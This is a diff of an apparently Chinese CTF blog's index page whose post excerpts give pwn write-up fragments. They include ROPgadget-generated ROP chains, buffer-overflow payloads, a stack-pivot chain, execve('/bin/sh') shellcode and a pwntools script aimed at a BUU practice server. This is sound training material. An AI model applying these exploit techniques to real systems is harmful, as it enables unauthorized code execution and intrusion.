@@ -157,32 +157,33 @@
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/ROPgadget-not_the_same_3dsctf_2016/">
-        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
+      <a href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/">
+        <p class="h4 index-header">堆之UAF(Use_after_free)及调试-hitcontraining_uaf</p>
       </a>
 
-      <a href="/2020/04/07/ROPgadget-not_the_same_3dsctf_2016/">
+      <a href="/2020/02/02/%E5%A0%86%E4%B9%8BUAF(Use_after_free)%E5%8F%8A%E8%B0%83%E8%AF%95-hitcontraining_uaf/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
+          <div class="index-text mb-1">堆之UAF(Use_after_free)及调试-hitcontraining_uaf
+https://wiki.x10sec.org/pwn/heap/use_after_free/
+一个很直接的想法是修改note的put字段为magic函数的地址，从而实现在执行print note 的时候执行magic函数。 那么该怎么执行呢？
+我们可以简单来看一下每一个note生成的具体流程
 
-ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
-自动生成
-from struct import pack
-p = &#39;&#39;
-p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
-p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
-p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
-p += &</div>
+程序申请8字节内存用来存放note中的put以及content指针。
+
+程序根据输入的size来申请指定大小的内存，然后用来存储content。
+
+
+      +-----------------+      </div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-02&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -190,8 +191,6 @@ p += &</div>
             <a href="/categories/CTF/">CTF</a>&nbsp;
           
             <a href="/categories/CTF/buu/">buu</a>&nbsp;
-          
-            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
           &nbsp;
         
         
@@ -203,100 +202,34 @@ p += &</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/">
-        <p class="h4 index-header">ROPgadget&amp;系统调用-cmcc_simplerop</p>
+      <a href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/">
+        <p class="h4 index-header">BrainOverFlow_Vol.1_BUU特供</p>
       </a>
 
-      <a href="/2020/04/07/ROPgadget&%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-cmcc_simplerop/">
+      <a href="/2020/01/30/BrainOverFlow_Vol.1_BUU%E7%89%B9%E4%BE%9B/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">ROPgadget&amp;系统调用-cmcc_simplerop
+          <div class="index-text mb-1">BrainOverFlow_Vol.1_BUU特供很有意思（好玩）的游戏，感谢札哥的题
 
-第一反应就是用ROPgadget自动生成ropchains
-但在这里不行，算出来的偏移是0x20，那么只有68字节给ropchains了
+btw，我也没想到我会是第六个解出来的hhhhh，我可以吹一个月（笑
+剧情我就不说了，反正很有意思的
+具体东西都藏在/www/data里边，每一次的地图数据（主要在Map013，15，22）都有，个人等级，姓名，武器售卖价值等都可以改hhhhh
+亏我三小时打通游戏，做了半天pwn以为是盲打，然后发现了文件就在图片旁边orz
+protect
 
-而自动生成的都太长了= =，只能手动调整ropchains长度
 
-参考http://m4x.fun/post/hitcon-training-writeup/
-
-    from struct import pack 
-
-    pop_edx_ecx_ebx = 0x0806e850
-    payload = cyclic(0x14 + 12) 
-
-    p = lambda x </div>
+这图就是溢出点，buf空间只有0x40，但是却读入0xC8个，题目没有system和/bin/sh字段，就是ret2libc
+# -*- coding: utf-8</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-30&nbsp;&nbsp;
         
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/buu/">buu</a>&nbsp;
-          
-            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/ROPgadget-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7/">-ROPgadget -系统调用号</a>&nbsp;
-          
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/">
-        <p class="h4 index-header">Python中下划线的5种含义</p>
-      </a>
-
-      <a href="/2020/04/07/Python%E4%B8%AD%E4%B8%8B%E5%88%92%E7%BA%BF%E7%9A%845%E7%A7%8D%E5%90%AB%E4%B9%89/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">在用python重写算法，学习学习算法时，一时好奇（打基础）来学习了python的下划线
-
-单前导下划线：_var            小小警示，提示只在内部使用，非public和private那种
-
-单末尾下划线：var_            解决命名冲突的问题
-
-双前导下划线：__var          防止变量在子类中被重写，只能在类内访问
-
-单下划线：_                        使用“_”来表示它只是一个临时值
-
-双前导和末尾下划线：
-__var__这个感觉有点奇怪，一个是常见的类内init，另一个则是下面这种len的写法
-
-class Linkedli</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/python/">python</a>&nbsp;
-          
-            <a href="/categories/python/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
-          &nbsp;
         
         
       </div>
@@ -307,51 +240,11 @@ class Linkedli</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
-        <p class="h4 index-header">Pwn常用指令</p>
-      </a>
-
-      <a href="/2020/04/07/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Pwn常用ldd filename 读取libc
-ROPgadget --binary filename --only &quot;pop|ret&quot;
-__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))
-__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])
-__libc_start_main = u32(sh.recv(4))
-canary =  u64(sh.recv(7).rjust(8,&quot</div>
-        </div>
-      </a>
-
-      <div class="index-btm">
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF/">CTF</a>&nbsp;
-          
-            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/pwn_by_examples/">
+      <a href="/2020/01/28/pwn_by_examples/">
         <p class="h4 index-header">pwn_by_examples</p>
       </a>
 
-      <a href="/2020/04/07/pwn_by_examples/">
+      <a href="/2020/01/28/pwn_by_examples/">
         
         
           
@@ -377,7 +270,7 @@ payload +</div>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-28&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -398,40 +291,43 @@ payload +</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/">
-        <p class="h4 index-header">PWN 环境搭建清单</p>
+      <a href="/2020/01/28/Hgame/">
+        <p class="h4 index-header">Hgame</p>
       </a>
 
-      <a href="/2020/04/07/PWN%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B8%85%E5%8D%95/">
+      <a href="/2020/01/28/Hgame/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">PWN 环境搭建清单LINUXubuntu18、16
-pwntools 
-edb 调试栈好
-vim
-libcsearcher
-pwndbg 调试堆好
-seccomp-tools 查看seccomp
-proxychains4 apt get的快
-WIN/MACIDA 反汇编
-die 查看32/64 和壳等
-一些常用指令
-可供参考exp from 南梦
-</div>
+          <div class="index-text mb-1">Hgame2020Hard_AAAAA
+
+V5在-0x31，s在-0xAC
+sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
+payload=&quot;a&quot;*(0xAC - 0x31)
+payload += &#39;0O0o\x00O0&#39;
+sh.send(payload)
+sh.interactive()
+One_Shot
+
+0xE0 - 0xC0之后刚好是32位，这样第
+payload = cyclic(0xE0 - 0xC0)
+sh.send(payload)
+sh.recvuntil(&quot;shot!\n&quot;</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-28&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PWN环境搭建</a>&nbsp;
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/Hgame/">Hgame</a>&nbsp;
           &nbsp;
         
         
@@ -443,46 +339,51 @@ die 查看32/64 和壳等
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/Proxychains/">
-        <p class="h4 index-header">Proxychains</p>
+      <a href="/2020/01/25/ciscn_2019_s_9/">
+        <p class="h4 index-header">ciscn_2019_s_9</p>
       </a>
 
-      <a href="/2020/04/07/Proxychains/">
+      <a href="/2020/01/25/ciscn_2019_s_9/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">折腾两小时，不如问一下人= =
-Proxychains
-先安装
-然后sudo vi /etc/proxychains.conf
-socks5 win_ip 1080
-win_ip为你的windows主机ip，可在cmd ifconfig查看
-飞机要打开允许局域网连接
+          <div class="index-text mb-1">ciscn_2019_s_9
+啥保护没开，第一时间考虑shellcode
 
-然后运行测试
-proxychains4 telnet www.google.com 443
-可以之后就可以直接sudo proxychains4 apt-get update了
-</div>
+
+另外leak只有50，leak多才考虑直接走rop
+
+尝试过ret2libc,但是怎么都调不出来= =
+shellcode =&#39;&#39;&#39;
+xor    eax,eax
+push   eax
+push   0x68732f2f #//sh
+push   0x6e69622f # /bin
+mov    ebx,esp
+mov    ecx,eax
+mov    edx,eax
+mov    al,0xb
+int    0x80
+xor    eax,eax
+inc    eax
+int    0x8</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-25&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/Linux%E4%BD%BF%E7%94%A8/">Linux使用</a>&nbsp;
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/buu/">buu</a>&nbsp;
           &nbsp;
         
-        
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Linux-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">Linux 问题解决</a>&nbsp;
-          
         
       </div>
     </div>
@@ -492,38 +393,29 @@ proxychains4 telnet www.google.com 443
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/">
-        <p class="h4 index-header">ORW-[极客大挑战2019]Not_Bad</p>
+      <a href="/2020/01/23/SROP-ciscn_2019_s_3/">
+        <p class="h4 index-header">SROP-ciscn_2019_s_3</p>
       </a>
 
-      <a href="/2020/04/07/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/">
+      <a href="/2020/01/23/SROP-ciscn_2019_s_3/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">ORW-[极客大挑战2019]Not_Bad
-RWX
+          <div class="index-text mb-1">SROP-ciscn_2019_s_3/es_7Sigreturn Oriented Programming (SROP) Attack攻击原理
+比较详细的WP
+https://www.jianshu.com/p/ca4a5dacd1a2
 
-Linux的文件和目录的权限，有RWX三种。
-r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。
-w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有新建，删除，修改，移动目录内文件的权限。
-x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限
+两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。还有一个gadget函数。
 
-
-
-什么是seccomp
-用seccomp-tools检测一下seccomp-tools dump  ./bad
-
-可运行open,read,write，也就是ORW
-关键点
-</div>
+有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。15 sys_rt_sigreturn59 sys_execve</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-23&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -536,11 +428,6 @@ x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录�
           &nbsp;
         
         
-          <i class="iconfont icon-tag"></i>
-          
-            <a href="/tags/Shellcode-ORW/">-Shellcode -ORW</a>&nbsp;
-          
-        
       </div>
     </div>
   </div>
@@ -549,35 +436,37 @@ x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录�
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/oneshot_tjctf_2016/">
-        <p class="h4 index-header">oneshot_tjctf_2016</p>
+      <a href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/">
+        <p class="h4 index-header">ciscn_2019_ne_5-骚骚的小东西</p>
       </a>
 
-      <a href="/2020/04/07/oneshot_tjctf_2016/">
+      <a href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">oneshot_tjctf_2016
+          <div class="index-text mb-1">ciscn_2019_ne_5-骚骚的小东西
 
-*v4，要用str(elf.got[&#39;__libc_start_main&#39;])
-接受要用int(sh.recvuntil(&quot;\n&quot;,True),16)
-exp
-# -*- coding: utf-8 -*-
+输入之后，在调用getflag这里会造成溢出
+
+函数里调用有system，但没有/bin/sh
+骚东西：
+0x80482E6 + 0x4就是 sh
+我们可以system(“sh”)也可以
+exp:
 from pwn import *
 context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-elf = ELF(&#39;./oneshot_tjctf_2016&#39;)
-lib = 0
-sh = 0
-def pwn(ip,port,</div>
+context.arch = &#39;i386&#39;
+#sh = process(&#39;ciscn_2019_ne_5&#39;)
+sh = remote(&quot;node3.buuoj.cn&quot;,27887)
+elf = </div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-20&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
@@ -596,40 +485,148 @@ def pwn(ip,port,</div>
     
     
     <div class="col-12 col-md-12 mx-auto index-info">
-      <a href="/2020/04/07/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
-        <p class="h4 index-header">Linux常见问题解决方法</p>
+      <a href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
+        <p class="h4 index-header">ez_pz_hackover_2016-继续深入学习edb</p>
       </a>
 
-      <a href="/2020/04/07/Linux%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
+      <a href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?
-ps -A | grep apt
-sudo kill -9 processnumber
+          <div class="index-text mb-1">ez_pz_hackover_2016-继续深入学习edb
 
-sudo rm /var/lib/dpkg/lock
-sudo rm /var/lib/dpkg/lock-fr</div>
+
+
+
+得先绕过result的strcmp
+sh.recvuntil(&quot;&gt;&quot;)
+payload = &quot;crashme&quot;
+payload = payload.ljust(10,&quot;\x00&quot;)
+payload += cyclic(200)
+pause()
+sh.sendline(payload)
+pause时，打开edb并attach ez_pz_hackover_2016
+我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行
+
+
+
+一直运行到不</div>
         </div>
       </a>
 
       <div class="index-btm">
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-07&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-18&nbsp;&nbsp;
         
         
           <i class="iconfont icon-inbox"></i>
           
-            <a href="/categories/Linux%E4%BD%BF%E7%94%A8/">Linux使用</a>&nbsp;
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/buu/">buu</a>&nbsp;
+          
+            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
           &nbsp;
         
         
-          <i class="iconfont icon-tag"></i>
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        <p class="h4 index-header">栈迁移</p>
+      </a>
+
+      <a href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        
+        
           
-            <a href="/tags/Linux-%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">Linux 问题解决</a>&nbsp;
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">栈迁移劫持一次流程，覆盖一次ebp
+栈迁移后跳到read
+正常Rop到libc，再rop，再到libc
+rop到libc，由于跳到read上，后面可以继续任意地址跳转
+pop_ret
+leave_ret  
+payload += elf.plt[‘puts’]
+payload += p32(pop_ebp_ret)
+payload += p32(elf.got[“__libc_start”])
+payload += addr
+payload += p32(leave_ret)
+
+
+
+
+没调用函数，函数的got值指向用户代码段，若被执行过会指向libc该函数的
+</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-15&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
           
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/%E5%B8%B8%E7%94%A8/">常用</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <div class="col-12 col-md-12 mx-auto index-info">
+      <a href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/">
+        <p class="h4 index-header">ROPgadget-not_the_same_3dsctf_2016</p>
+      </a>
+
+      <a href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/">
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ROPgadget-not_the_same_3dsctf_2016
+
+ROPgadget --binary not_the_same_3dsctf_2016 --ropchain
+自动生成
+from struct import pack
+p = &#39;&#39;
+p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; ret
+p += &</div>
+        </div>
+      </a>
+
+      <div class="index-btm">
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-14&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF/">CTF</a>&nbsp;
+          
+            <a href="/categories/CTF/buu/">buu</a>&nbsp;
+          
+            <a href="/categories/CTF/%E5%A4%87%E5%BF%98/">备忘</a>&nbsp;
+          &nbsp;
+        
         
       </div>
     </div>
